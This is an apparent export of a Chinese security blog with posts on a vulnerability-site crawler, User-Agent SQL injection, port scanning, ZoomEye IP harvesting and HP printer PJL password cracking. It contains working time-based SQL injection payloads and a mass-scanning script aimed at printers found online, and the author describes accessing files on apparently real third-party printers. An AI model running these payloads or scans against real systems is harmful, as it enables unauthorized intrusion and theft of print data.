coding:utf-8# author: anka9080# version: 1.0 py3 import sys,re,time,socketfrom requests import getfrom queue import Queue, Emptyfrom threading import Thread # 全局变量COUNT = 1START_URL = 'http://wooyun.org/bugs'ID_DETAILS = []ALL_ID = []Failed_ID = []PROXIES = [] HEADERS = &#123; \"Accept\": \"text/html,application/xhtml+xml,application/xml,application/json;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, sdch\", \"Accept-Language\": \"zh-CN,zh;q=0.8\", \"Cache-Control\": \"max-age=0\", \"Connection\": \"keep-alive\", \"DNT\": \"1\", \"Host\": \"wooyun.org\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2716.0 Safari/537.36\"&#125; class WooYunSpider(Thread): \"\"\"docstring for WooYunSpider\"\"\" def __init__(self,queue): Thread.__init__(self) self.pattern1 = re.compile(r'title&gt;(.*?)\\| WooYun.*?keywords\" content=\"(.*?),(.*?),(.*?),wooyun',re.S) # 匹配模式在 compile 的时候指定 self.pattern2 = re.compile(r\"漏洞Rank：(\\d&#123;1,3&#125;)\") self.queue = queue self.start() # 执行 run() def run(self): \"每次读取 queue 的一条\" global COUNT,RES_LOG,ERR_LOG while(1): try: id = self.queue.get(block = False) r = get('http://wooyun.org/bugs/' + id,headers = HEADERS) html = r.text except Empty: break except Exception as e: msg = '[ - Socket_Excpt ] 链接被拒绝，再次添加到队列：' + id print(msg) ERR_LOG.write(msg+'\\n') self.queue.put(id) # 访问失败则把这个 URL从新加入队列 else: title,comp,author,bug_type,rank = self.get_detail(html,id) detail = id+'----'+title+'----'+comp+'----'+author+'----'+bug_type+'----'+rank try: # 写入文件可能会诱发 gbk 编码异常，这里保存 id 到 failed RES_LOG.write(detail + '\\n') except Exception as e: Failed_ID.append(id) msg = '[ - Encode_Excpt ] 字符编码异常：' + id print(msg) ERR_LOG.write(msg+'\\n') ID_DETAILS.append(detail) # time.sleep(1) print('[ - info ] id: &#123;&#125; count: &#123;&#125; time: &#123;:.2f&#125;s'.format(id,COUNT,time.time() - start)) COUNT += 1 # 由 缺陷编号 获得对应的 厂商 和 漏洞类型信息 def get_detail(self,html,id): global ERR_LOG try: # print(html) res = self.pattern1.search(html) title = res.group(1).strip() comp = res.group(2).strip() author = res.group(3).strip() bug_type = res.group(4).strip() except Exception as e: msg = '[ - Detail_Excpt ] 未解析出 标题等相关信息：' + id print(msg) ERR_LOG.write(msg+'\\n') Failed_ID.append(id) title,comp,author,bug_type,rank = 'Null','Null','Null','Null','Null' else: try: res2 = self.pattern2.search(html) # 若厂商暂无回应则 rank 为 Null rank = res2.group(1).strip() except Exception as e: msg = '[ - Rank_Excpt ] 未解析出 Rank：' + id print(msg) ERR_LOG.write(msg+'\\n') rank = 'Null' finally: try: print (title,comp,author,bug_type,rank) except Exception as e: msg = '[ - Print_Excpt ] 字符编码异常：' + id +'::'+ str(e) print(msg) ERR_LOG.write(msg+'\\n') return title,comp,author,bug_type,rank class ThreadPool(object): def __init__(self,thread_num,id_file): self.queue = Queue() # 需要执行的队列 self.threads = [] # 多线程列表 self.add_task(id_file) self.init_threads(thread_num) def add_task(self,id_file): with open(id_file) as input: for id in input.readlines(): self.queue.put(id.strip()) def init_threads(self,thread_num): for i in range(thread_num): print ('[ - info :] loading threading ---&gt; ',i) # time.sleep(1) self.threads.append(WooYunSpider(self.queue)) # threads 列表装的是 爬虫线程 def wait(self): for t in self.threads: if t.isAlive(): t.join() def test(): url = 'http://wooyun.org/bugs/wooyun-2016-0177647' r = get(url,headers = HEADERS) html = r.text # print type(html) # keywords\" content=\"(.*?),(.*?),(.*?),wooyun ====&gt; 厂商，白帽子，类型 pattern1 = re.compile(r'title&gt;(.*?)\\| WooYun') pattern2 = re.compile(r'keywords\" content=\"(.*?),(.*?),(.*?),wooyun') pattern3 = re.compile(r'漏洞Rank：(\\d&#123;1,3&#125;)') for x in range(500): res = pattern1.search(html) # print (res.group(1)) res = pattern2.search(html) # print (res.group(1),res.group(2),res.group(3)) res = pattern3.search(html) # print (res.group(1)) x += 1 print(x) # rank = res.group(4).strip() # print html def test2(): url = 'http://wooyun.org/bugs/wooyun-2016-0177647' r = get(url,headers = HEADERS) html = r.text pattern = re.compile(r'title&gt;(.*?)\\| WooYun.*?keywords\" content=\"(.*?),(.*?),(.*?),wooyun.*?漏洞Rank：(\\d&#123;1,3&#125;)',re.S) for x in range(500): res = pattern.search(html) # print (res.group(1),res.group(2),res.group(3),res.group(4),res.group(5)) x += 1 print(x)# 保存结果def save2file(filename,filename_failed_id): with open(filename,'w') as output: for item in ID_DETAILS: try: # 写入文件可能会诱发 gbk 编码异常，这里忽略 output.write(item + '\\n') except Exception as e: pass with open(filename_failed_id,'w') as output: output.write('\\n'.join(Failed_ID)) if __name__ == '__main__': socket.setdefaulttimeout(1) start = time.time() # test() # 日志记录 ERR_LOG = open('err_log.txt','w') RES_LOG = open('res_log.txt','w') id_file = 'id_0526.txt' # id_file = 'id_test.txt' tp = ThreadPool(20,id_file) tp.wait() save2file('id_details.txt','failed_id.txt') end = time.time() print ('[ - info ] cost time :&#123;:.2f&#125;s'.format(end - start))","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://www.evilclay.com/tags/Python/"},{"name":"多线程","slug":"多线程","permalink":"http://www.evilclay.com/tags/多线程/"},{"name":"乌云爬虫","slug":"乌云爬虫","permalink":"http://www.evilclay.com/tags/乌云爬虫/"},{"name":"正则表达式","slug":"正则表达式","permalink":"http://www.evilclay.com/tags/正则表达式/"}]},{"title":"User-Agent 手工注入的探测与利用分析","slug":"ua-sql-injection","date":"2016-05-26T10:15:23.000Z","updated":"2016-05-29T03:34:19.827Z","comments":true,"path":"2016/05/26/ua-sql-injection/","link":"","permalink":"http://www.evilclay.com/2016/05/26/ua-sql-injection/","excerpt":"","text":"原理很简单：后台在接收UA时没有对UA做过滤，也没有PDO进行数据交互（实际PDO是非常有必要的），导致UA中有恶意代码，最终在数据库中执行。 0x00 Bug 代码：本地顺手打了一个环境，Bug 代码部分： 123456789// 保存到访者的IP信息$db=DBConnect();$tbLog=$db-&gt;tbPrefix.'log'; $executeArr=array('ip'=&gt;($_SERVER[\"HTTP_VIA\"])?$_SERVER[\"HTTP_X_FORWARDED_FOR\"]:$_SERVER[\"REMOTE_ADDR\"],'ua'=&gt;$_SERVER['HTTP_USER_AGENT'],'visit_time'=&gt;date('Y-m-d H:i:s'));$db-&gt;AutoExecute($tbLog,$executeArr);$smarty=InitSmarty();$smarty-&gt;assign('do',$do);$smarty-&gt;assign('show',$show);$smarty-&gt;assign('url',$url);$smarty-&gt;display('login.html'); 其中 AutoExecute() 方法 代码如下： 123456789101112131415public function AutoExecute($table,$array=array(),$type='INSERT',$where='')&#123; if(!empty($array) &amp;&amp; !empty($table))&#123; switch(strtoupper($type))&#123; case 'INSERT': $sql=\"INSERT INTO &#123;$table&#125;(\".implode(',',array_keys($array)).\") VALUES('\".implode(\"','\",array_values($array)).\"')\"; echo $sql; break; default:break; &#125; return $this-&gt;Execute($sql); &#125; else&#123; return false; &#125;&#125; 可以看出 ip，ua 这个变量未经过任何过滤 以 SQL 拼接的方式插入到数据库中。 0x01 SQLMap 初探因为是 HTTP Header 注入，所以决定简单粗暴的使用 -r 参数测试有无注入。 用burp 代理截包保存成 req.txt ,内容如下： GET /index.php?do=login HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: csrftoken=zfPpDQbDhjPJ7Xbh8z3aMqAxhVv8vvCs Connection: keep-alive 使用 sqlmap.py -r req.txt –level 3 没跑出来，姿势不对？？？ 决定用自己的双手实现自己的梦想啦~~ 0x02 手动注入测试使用burp 的repeater 模块，修改User-Agent： GET /index.php?do=login HTTP/1.1 Host: localhost User-Agent: Anka9080&apos;,(select(sleep(5))))# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: csrftoken=zfPpDQbDhjPJ7Xbh8z3aMqAxhVv8vvCs Connection: keep-alive 结果真会发现等待了5s才收到网站的返回信息，延时注入测试成功~~ 该请求发送后，实际执行的SQL语句 如下： INSERT INTO log(ip,ua,visit_time) VALUES(&apos;127.0.0.1&apos;,&apos;Anka9080&apos;,(select(sleep(5))))#&apos;,&apos;2016-05-26 20:15:41&apos;) 进一步分析这条SQL语句： Select(sleep(5)) 返回的是 0 ，在外层加上一对括号，相当于单引号(‘’)，还有一个右括号) 用来闭合 VALUES 的 左括号，类似于字符型插入，后面的 # 是注释符，会把原本的时间等数据给注释掉，保证了这是一条可执行的SQL语句。 0x03 猜数据，读文件预先在数据库中创建了表 user(user,pass) 存在一个条目 admin,admin666 通过sleep判断基于时间的延时注射，下面手工构造用户名并根据相应时间来判断是否存在这个用户（在 UA 位置执行整条SQL 来判断）： 把 UA 的值改成如下： User-Agent: Anka9080&apos;,(select sleep(5) from user where substring(user,1,1)=&apos;a&apos;))# 执行的SQL是： INSERT INTO log(ip,ua,visit_time) VALUES(&apos;127.0.0.1&apos;,&apos;Anka9080&apos;,(select sleep(5) from user where substring(user,1,1)=&apos;a&apos;))#&apos;,&apos;2016-05-26 21:04:49&apos;) 若user 表 中存在以a 开头的数据，则会延迟5秒返回页面， 当然一般要先对用户表user 做 fuzzing， 这个把 where 条件去掉就可以了。 同理 使用 substring(user,1,n) 来判断第n个字符是什么，继而得到了完整的字段的值。 已经能读出数据了，尝试下读写文件，理论上有权限就可以。 把user 表的内容读出来并写入到服务器文件中： INSERT INTO log(ip,ua,dt) VALUES(&apos;127.0.0.1&apos;,&apos;Anka9080&apos;,(select * from user into outfile &apos;盘/绝对路径/1.txt&apos;))#&apos;,&apos;2016-05-26 21:30:04&apos; 不知为何没有执行成功 在 SQL 查询器里单独执行 select * from user into outfile &apos;盘/绝对路径/1.txt&apos; 是可以的… 如果注入点是有输出的位置，则 利用Id = 1 union select 1, loadfile(‘盘/绝对路径/1.txt’) from message 来读取文件内容到页面显示 此外，其他 HTTP Header 的注入与 User-Agent 的注入是一样道理的。 0x04 SQL注入防御至于防御SQL注入，预编译吧，简单可靠，不需要做任何的过滤，做到了“数据和代码的分离 &lt;?php $link = new mysqli('localhost', 'analytics_user', 'aSecurePassword', 'analytics_db'); $stmt = $link-&gt;prepare(\"INSERT INTO visits (ua, dt) VALUES (?, ?)\"); $stmt-&gt;bind_param(\"ss\", $_SERVER[\"HTTP_USER_AGENT\"], date(\"Y-m-d h:i:s\")); $stmt-&gt;execute(); ?&gt; 参考文章：http://www.freebuf.com/articles/web/105124.html","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://www.evilclay.com/tags/漏洞分析/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://www.evilclay.com/tags/SQL注入/"}]},{"title":"Python ThreadPool 线程池模板","slug":"python-multithreads-templete","date":"2016-05-24T10:11:29.000Z","updated":"2016-05-29T03:32:45.567Z","comments":true,"path":"2016/05/24/python-multithreads-templete/","link":"","permalink":"http://www.evilclay.com/2016/05/24/python-multithreads-templete/","excerpt":"","text":"0x 00 Why Python 的 简单多线程实现 用 dummy 模块 一句话就可以搞定，但需要对线程，队列做进一步的操作，最好自己写个线程池类来实现，考虑到后期会经常使用，所以把模板贴出来。 0x 01 Coding1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# coding:utf-8# version: 0.1import re,timefrom requests import getfrom Queue import Queue, Emptyfrom threading import Thread # 全局变量COUNT = 0 # 爬虫类class Spider(Thread): \"\"\"docstring for Spider\"\"\" def __init__(self,queue): Thread.__init__(self) self.queue = queue self.start() # 执行 run() def run(self): \"每次读取 queue 的一条\" global COUNT while(1): try: sth = self.queue.get(block=false) except Empty: break except Exception,e: print '[- Excpt :]',str(e) print COUNT COUNT += 1 # 线程池类class ThreadPool(object): def __init__(self): self.queue = Queue() # 需要执行的队列 self.threads = [] # 多线程列秒 pass def add_task(self): pass def init_threads(self): pass def wait(self): for t in self.threads: if t.isAlive(): t.join() if __name__ == '__main__': start = time.time() tp = ThreadPool(thread_num) tp.wait() end = time.time() print '[ - info ] cost time :&#123;&#125;'.format(end - start)","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://www.evilclay.com/tags/Python/"},{"name":"多线程","slug":"多线程","permalink":"http://www.evilclay.com/tags/多线程/"}]},{"title":"Python 调用 ZoomEye API 批量获取目标网站IP","slug":"zoomeye-api","date":"2016-03-30T10:03:39.000Z","updated":"2016-05-29T03:34:48.749Z","comments":true,"path":"2016/03/30/zoomeye-api/","link":"","permalink":"http://www.evilclay.com/2016/03/30/zoomeye-api/","excerpt":"","text":"0x 00 前言 ZoomEye 的 API 在前几天正式对外部开发，这对网络渗透人员来说是一件开心的事 可以说“妈妈再也不用担心批量测(x)试(zhan)没有资源了。” 官方的 API 帮助文档在下面： https://www.zoomeye.org/api/ 看了下，使用方法是先提交账户，密码获得一个唯一的访问令牌（access_token） 然后每次调用 API 的时候在 HTTP 的 Headers 里加上格式化后的 access_token 就可以使用了 官方文档为了方便使用给出的是 cURL 方式调用 API ，在这里我给出一个用 Python 调用 API 的 Demo 0x 01 Code 该 Demo 抓取 ZoomEye 上 搜索 dedecms 的所有结果并把前 100 个IP保存到 文件中. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100# coding: utf-8# author : anka9080# datetime: 20160330 import osimport requestsimport json access_token = ''ip_list = [] def login(): \"\"\" 输入用户米密码 进行登录操作 :return: 访问口令 access_token \"\"\" user = raw_input('[-] input : username :') passwd = raw_input('[-] input : password :') data = &#123; 'username' : user, 'password' : passwd &#125; data_encoded = json.dumps(data) # dumps 将 python 对象转换成 json 字符串 try: r = requests.post(url = 'http://api.zoomeye.org/user/login',data = data_encoded) r_decoded = json.loads(r.text) # loads() 将 json 字符串转换成 python 对象 global access_token access_token = r_decoded['access_token'] except Exception,e: print '[-] info : username or password is wrong, please try again ' exit() def saveStrToFile(file,str): \"\"\" 将字符串写如文件中 :return: \"\"\" with open(file,'w') as output: output.write(str) def saveListToFile(file,list): \"\"\" 将列表逐行写如文件中 :return: \"\"\" s = '\\n'.join(list) with open(file,'w') as output: output.write(s) def apiTest(): \"\"\" 进行 api 使用测试 :return: \"\"\" page = 1 global access_token with open('access_token.txt','r') as input: access_token = input.read() # 将 token 格式化并添加到 HTTP Header 中 headers = &#123; 'Authorization' : 'JWT ' + access_token, &#125; # print headers while(True): try: r = requests.get(url = 'http://api.zoomeye.org/host/search?query=\"dedecms\"&amp;facet=app,os&amp;page=' + str(page), headers = headers) r_decoded = json.loads(r.text) # print r_decoded # print r_decoded['total'] for x in r_decoded['matches']: print x['ip'] ip_list.append(x['ip']) print '[-] info : count ' + str(page * 10) except Exception,e: # 若搜索请求超过 API 允许的最大条目限制 或者 全部搜索结束，则终止请求 if str(e.message) == 'matches': print '[-] info : account was break, excceeding the max limitations' break else: print '[-] info : ' + str(e.message) else: if page == 10: break page += 1 def main(): # 访问口令文件不存在则进行登录操作 if not os.path.isfile('access_token.txt'): print '[-] info : access_token file is not exist, please login' login() saveStrToFile('access_token.txt',access_token) apiTest() saveListToFile('ip_list.txt',ip_list) if __name__ == '__main__': main() 0x03 运行测试 打开 access_token.txt 文件： 打开 ip_list.txt 文件： 题外话： 使用 Firefox 的 Modify Headers 添加上 Authentication 这个 头信息后在浏览器里可以 直接看到返回的 JSON 字符串结果，如下","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://www.evilclay.com/tags/Python/"},{"name":"ZoomEye","slug":"ZoomEye","permalink":"http://www.evilclay.com/tags/ZoomEye/"}]},{"title":"多线程端口扫描器的 Python 脚本","slug":"python-multithread-ports-scanner","date":"2016-03-09T09:26:32.000Z","updated":"2016-05-29T03:32:18.538Z","comments":true,"path":"2016/03/09/python-multithread-ports-scanner/","link":"","permalink":"http://www.evilclay.com/2016/03/09/python-multithread-ports-scanner/","excerpt":"","text":"0x 00 Before Coding当端口打开时，向端口发送 TCP SYN 请求，会返回一个 ACK 响应: 当端口关闭，返回的是 RST 响应： Coding可以用 socket 编写一个小脚本来测试主机端口的开启情况，基本代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445# coding: utf-8#author: anka9080import socketfrom datetime import datetime# Set time-out to get the scanning fastsocket.setdefaulttimeout(0.5)# Ask for inputremote_server = raw_input(\"Enter a remote host to scan:\")remote_server_ip = socket.gethostbyname(remote_server)# Print a nice banner with info on which host we are about to scanprint '-' * 60print 'Please wait, scanning remote host ', remote_server_ipprint '-' * 60# Check what time the scan startedt1 = datetime.now()# Using the range function to specify ports(1 - 1024)# We also put in some error handling for catching errorstry: for port in range(1,1025): sock = socket.socket(2,1) # 2:socket.AF_INET 1:socket.SOCK_STREAM res = sock.connect_ex((remote_server_ip,port)) if res == 0: print 'Port &#123;&#125;: OPEN'.format(port) sock.close()except socket.gaierror: print 'Hostname could not be resolved.Exiting'except socket.error: print \"Could't connect to the server\"# Check the time nowt2 = datetime.now()# Calculates the difference of timetotal = t2 - t1# Print the info to screenprint 'Scanning Completed in: ', total 程序测试结果如下： 看出来 在 socket 的超时时间设置为0.5的前提下 依然需要花费 8分27秒才能够把周知端口号扫完，有没有其他方式加快扫描速度？答案是有的。 // ** 该部分可以略过，本人踩到的一个小坑 打开 抓到的数据包列表，发现 timeout 包都会发送2个“伪重传”，发送这两个一般没什么用的数据包会占用 CPU的处理时间， 所以在想能不能不让程序发这两个包来提高效率？？ 自己分析连续两个端口的时间间隔就会发现：间隔是0.5s（由 39号、46号、53号数据包分析得出），这恰好是在程序中设置的超时时间， 也就是说超时重传的包并不会占用专门的时间，所以这种想法就被干掉了。 这样的话，1个端口0.5的超时等待，扫描一个主机的 1- 1024 号端口所用时间是可以大致估算下的： 1024 * 0.5 / 60 = 8.53 分钟左右。和上面程序实际扫描的时间（8分27秒）相符合。 // 越过坑 ：P ** 0x 02 Better Coding所以对于这种时间主要花费在 socket 连接( 非 CPU 计算密集型 )的程序 可以使用 多线程来提升效率， 这里选择使用内建的库 multiprocessing.dummy 来实现多线程扫描： 1234567891011121314151617181920212223242526272829303132333435363738394041424344# coding: utf-8# proj: 多线程 Socket TCP 端口扫描器# author: anka9080import socketfrom datetime import datetimefrom multiprocessing.dummy import Pool as ThreadPool remote_server = raw_input(\"Enter a remote host to scan:\")remote_server_ip = socket.gethostbyname(remote_server)ports = [] print '-' * 60print 'Please wait, scanning remote host ', remote_server_ipprint '-' * 60 socket.setdefaulttimeout(0.5) def scan_port(port): try: s = socket.socket(2,1) res = s.connect_ex((remote_server_ip,port)) if res == 0: # 如果端口开启 发送 hello 获取banner print 'Port &#123;&#125;: OPEN'.format(port) s.close() except Exception,e: print str(e.message) for i in range(1,1025): ports.append(i) # Check what time the scan startedt1 = datetime.now() pool = ThreadPool(processes = 8)results = pool.map(scan_port,ports)pool.close()pool.join() print 'Multiprocess Scanning Completed in ', datetime.now() - t1 扫描的结果如下： 可以发现 8 个线程并行发起请求，效率有很大的提升。 在被扫描主机未安装连接限制软件的前提下，测试了开启不同线程扫描所花费的时间 ： 16 个线程 使用 32 秒扫完； 32个线程，使用 16 秒扫完； 64个线程，使用 8 秒扫完； 128个线程，使用 4 秒扫完； 256个线程，使用 2 秒扫完； 512个线程，使用 1.50 秒扫完； 1024个线程，使用 1.25 秒扫完； 至于开多少线程合适要自己来 fuzzing ， 不要以为开的线程越多越好，因为线程的创建，线程之间的切换也是要消耗资源的。 要获取 Banner 的话，把核心函数修改成如下即可： 123456789101112131415161718192021def scan_port(port): try: s = socket.socket(2,1) res = s.connect_ex((remote_server_ip,port)) if res == 0: # 如果端口开启 发送 hello 获取banner try: s.send('hello') banner = s.recv(1024) except Exception,e: print 'Port &#123;&#125;: OPEN'.format(port) print str(e.message) else: print 'Port &#123;&#125;: OPEN'.format(port) print 'Banner &#123;&#125;'.format(banner) s.close() except Exception,e: print str(e.message)","categories":[],"tags":[{"name":"端口扫描","slug":"端口扫描","permalink":"http://www.evilclay.com/tags/端口扫描/"},{"name":"Python","slug":"Python","permalink":"http://www.evilclay.com/tags/Python/"},{"name":"多线程","slug":"多线程","permalink":"http://www.evilclay.com/tags/多线程/"}]},{"title":"HP 打印机 PCL 漏洞分析与利用","slug":"printer-hack","date":"2016-03-02T09:46:18.000Z","updated":"2016-05-29T03:31:10.938Z","comments":true,"path":"2016/03/02/printer-hack/","link":"","permalink":"http://www.evilclay.com/2016/03/02/printer-hack/","excerpt":"","text":"0x01 漏洞概要PCL代表打印机控制语言（Printer Control Language），由惠普公司开发，并被广泛使用的一种打印机协议。关于另一种页面描述语言，应该提一提由Adobe设计的PostScript（PS），它可以将更为复杂的事情交由绘图仪/打印机处理。PJL (Printer Job Language，打印机作业语言)作为PCL的扩展，用于指导打印机行为，比如更改设备设置、传输文件等。 若打印机的9100端口向公网开启，在向打印机发送PJL指令之前需要对使用者的身份进行认证，认证程序的密钥长度为２字节(Byte)，因此可以通过暴力破解认证密钥想打印机发送PJL指令，最终导致任意命令的执行。 PJL (Printer Job Language)程序用于告诉打印机执行什么动作，是对PCL的额外支持。 PJL (Printer Job Language) 用于规范格式化页面的基本语言。本身是无害的，但却成为大多数解析器和解释器的漏洞利用代码。 0x02 漏洞原理打印机系统9100端口开启时，若连上该端口通过PJL指令发送设备名称请求并得到打印机的响应，说明可以未授权访问打印机，PJL保护机制的密钥由２个字节(16比特)的存储单位存储，可以进行暴力破解攻击，从而得到目标打印机的完全访问权限。 根据国外安全研究员PHENOELIT 已经写好了漏洞利用程序，对其中的主要代码进行分析，得到下面的流程图 下面是破解密钥部分的代码： 在pjlsession.cpp中的230到256行 String ts; char numb[50]; if ((pass==0)||(pass&gt;65535)) throw ExInvalid();#ifndef UNIX _snprintf(numb,49,”%u”,pass);#else snprintf(numb,49,”%u”,pass);#endif //UNIX connection.clear(); connection.sendbuf.set(PJL_START); connection.sendbuf.append(“\\r\\n”); connection.sendbuf.append(“@PJL JOB PASSWORD=”); connection.sendbuf.append(numb); connection.sendbuf.append(“\\r\\n@PJL DEFAULT PASSWORD=0 \\r\\n”); connection.sendbuf.append(“@PJL EOJ\\r\\n”); connection.sendbuf.append(PJL_FINISH); connection.senddata(); // TEST !!! // connection.recvatleast(9,ctimeout); // end TEST connection.sendbuf.clear(); 因为打印机所使用的密码长度只有2个字节，即16个bit, 65535中表示方法，所以密码范围在0到65535之间，这就是为什么程序能暴力破解打印机认证密码。connection.sendbuf.set()后面根据PJL协议发送指定的数据包。使攻击者在破解密码之后可以用里面的命令进行任意操作了。 0x03 案例分析首先获取可能存在漏洞的打印机IP地址，打开www.zoomeye.org，输入漏洞关键字 HP LaserJet 进行搜索。搜索结果如下： 从结果中可以看到一些带有 HP LaserJet 标签的互联网主机和所属国家信息，这些主机就很有可能隐藏着打印机漏洞。我们从中选取一些进行测试。 Nmap端口扫描 Nmap的扫描结果显示主机不但开启了9100端口，80，443，23端口也开着，入侵也就多了一些其他的方式。 我们使用 PHENOELIT 开发的PFT工具来进行渗透测试。这个用C++写成的黑客工具有简单的命令行交互界面，专门用来破解PLJ接口的打印机，获取打印机的环境变量、文件系统和重要目标文件。 PFT密码破解 我们运行PFT工具，用 help 命令查看帮助文档 可以用PFT提供的暴力破解功能清除掉打印机的 PJL 程序保护。 显示密码清除成功，使用 ls 命令查看打印机上硬盘里的文件： 在这里可以查看打印机硬盘中存放的所有东西。如果打印机缓存了打印文件，在这里也是可以找到的。我们可以进入一个目录选择一个文件下载到本地： 查看L006105.XML文件的内容： 在这里可以查看到一些诸如本次打印的任务主机IP，邮箱，打印的文件名等敏感信息。 XSS攻击 存在于惠普打印机中风险的仅仅是拒绝服务,信息泄漏这么简单吗?在 Exploit-DB网站 中找到 HPLaserJet printers - Multiple Stored XSS Vulnerabilities(点击连接) 惠普打印机的多个存储型 XSS 漏洞, 对应 CVE 号: CVE-2012-3272 没给出利用方式，试着打开浏览器Fuzz了出来： 点击WEB的“支持信息”连接 点击 Apply 按钮，出现了 XSS 弹框： 利用该漏洞，配合 Beef 攻击框架，通过一段编写好的 JavaScript（hook.js）控制目标主机的浏览器，通过目标主机浏览器获得该主机的详细信息，并进一步扫描内网，配合 Metasploit 绝对是内网渗透一大杀器。 0x04 全球漏洞分布 自动测试脚本 HP打印机的厂商已经对固件进行了升级，采用更安全的加密机制处理PJL密钥，不过由于全球范围用户基数比较大，已经用户安全意识不强，依然大量存在这种受害打印机，由ZoomEye网络空间搜索引擎导出的数据接合我们小组写的自动化扫描脚本。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#!/usr/bin/env python# -*- coding: UTF-8 -*-import socketimport jsonimport sysfrom optparse import OptionParserPJL_START = \"\\033%-12345X@PJL \"PJL_FINISH = \"\\033%-12345X\\r\\n\"PJL_USTATUS = \"USTATUS DEVICE=\"PJL_INFO_ID = \"INFO ID\\r\\n\"EOF = PJL_START + PJL_USTATUS + \"OFF\\r\\n\" + PJL_FINISH #PJL 语言DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH #PJL 语言 获取设备型号class Printer(): def __init__(self): self.usage() if sys.argv &lt; 1 : self.usage() self.readfile(options.file) def usage(self): parser = OptionParser() parser.add_option(\"-i\", \"--ip\", dest=\"ip\", help=\"test single ip\") # parser.add_option(\"-f\", \"--file\",dest=\"file\", help=\"files \") # global options (options, args) = parser.parse_args() def Buildsocket(self, ip, port=9100): sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0) #与主机建立socket连接 sock.settimeout(5) try: sock.connect((ip, port)) except: print \"[!*]-ip-%s-can't connect--\" % ip return 'error' sock.send(EOF) sock.send(DEVICEID) # 发送PJL指令给远程打印机 try: device = sock.recv(1024) except: return 'No' print \"[!*]-ip-%s-is-ok\\r\\ndeviceidis-%s\" % (str(ip), device) sock.close() return 'OK' def GetDiviceMap(self, data,status): f = open('result.txt', 'a+') try: f.write(str(data['ip']) + ', ' + status + ', ' + str(data['geoinfo']['country']['name']['en']) +', '+ str(data['geoinfo']['city']['en']) + ', ' + str(data['geoinfo']['location']['longitude']) +', '+ str(data['geoinfo']['location']['latitude']) + ', ' + str(data['geoinfo']['country']['code']) +', ' + str(data['geoinfo']['continent']['name']['en']) + \"\\r\\n\") except: pass f.close() def readfile(self, file): Vuln_ip = 0 # ip 列表输入的IP数量 No_vuln_ip = 0 CantConnectIP = 0 linenum = 0 f = open(file, 'r') for line in f.readlines(): data = json.loads(line) status = self.Buildsocket(data['ip']) if status == 'error': CantConnectIP += 1 elif status == 'No': No_vuln_ip += 1 else: Vuln_ip += 1 self.GetDiviceMap(data, status) linenum += 1 print \"[!*]-Now-is-%s-lines\" % str(linenum) f.close() print str(CantConnectIP) + \" \" + str(No_vuln_ip) + \" \" + str(Vuln_ip)if __name__ == '__main__': Printer() 全球影响面 这个漏洞波及了很多国家和地区，以美国最盛。我们用小组开发的自动化脚本加上ZoomEye提供的1万组惠普打印机IP进行测试。 结果绘制成图表如下。 全球可入侵IP分布 全球已修复IP分布 可以看到，美国是 PCL 打印机漏洞的重灾区，至今还拥有数量最多的漏洞主机。韩国也受到了很大的影响。其他国家，包括中国，有漏洞的打印机数量都不多，而且一半以上已被修复。 0x05 修补建议对打印机管理员有以下建议： 不使用的服务，如 FTP ，TELNET 服务，应手动关闭。 直接关闭 9100 端口，不允许外网访问。 不要使用公网 IP 作为打印机地址。 关注产品动态，保证及时更新。 本文由 我和另外两个小伙伴 fengxuan zhufengdaaa 完成。 参考网址： https://www.altamiracorp.com/blog/employee-posts/hacking-hp-printers-for-fun-profit https://en.wikipedia.org/wiki/Printer_Job_Language http://www.51cto.com/art/200508/7989.htm https://www.exploit-db.com/exploits/10011/ http://www.freebuf.com/articles/system/7115.html","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://www.evilclay.com/tags/漏洞分析/"},{"name":"打印机漏洞","slug":"打印机漏洞","permalink":"http://www.evilclay.com/tags/打印机漏洞/"}]},{"title":"GitHub 常用命令备忘录","slug":"github-cmd","date":"2015-07-10T09:42:04.000Z","updated":"2016-05-28T09:43:46.604Z","comments":true,"path":"2015/07/10/github-cmd/","link":"","permalink":"http://www.evilclay.com/2015/07/10/github-cmd/","excerpt":"","text":"git init 把当前目录变成Git可以管理的仓库随后出现.git目录，这个目录是Git来跟踪管理版本库的git commit -m “change message” 提交代码到Gitgit add file1.txtgit add file2.txt 先添加多个文件 之后一起提交 git status 命令可以让我们时刻掌握仓库当前的状态比如：文件是否被修改，修改后是否提交git diff readme.txt 查看这个文件上次修改具体改了那些内容 git中的一次commit 是仓库的一个快照，一旦文件出现了差错，可以从最近的一个commit恢复git log 显示最近到最远的提交日志，用于回溯版本 get reset –hard [HEAD^|commit id] git reflog 现实对版本库的各种操作记录，用于重返未来 工作区：电脑里能看到的目录版本库：.git（隐藏目录），Git的版本库Git的版本库里有很多东西，其中最重要的就是stage（暂存区）+master把文件往Git版本库里提交的时候，分两步执行：git add 把 文件添加到暂存区git commit 把暂存区的所有文件提交到当前分支 一旦提交后，如果没有对工作区做任何修改，那么工作区的status就是“干净”的 第一次修改-&gt;git add -&gt; 第二次修改 -&gt; git commitgit 